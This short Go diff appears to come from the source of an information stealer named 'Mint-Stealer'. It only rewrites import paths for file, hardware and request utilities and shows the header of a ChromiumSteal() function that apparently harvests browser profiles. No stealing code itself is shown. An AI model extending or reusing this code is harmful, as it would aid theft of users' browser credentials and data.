@@ -2,12 +2,13 @@ package browsers
 
 import (
 	"fmt"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/fileutil"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/requests"
 	"os"
 	"path/filepath"
 	"strings"
+
+	"github.com/0xFl4q/Mint-Stealer/utils/fileutil"
+	"github.com/0xFl4q/Mint-Stealer/utils/hardware"
+	"github.com/0xFl4q/Mint-Stealer/utils/requests"
 )
 
 func ChromiumSteal() []Profile {
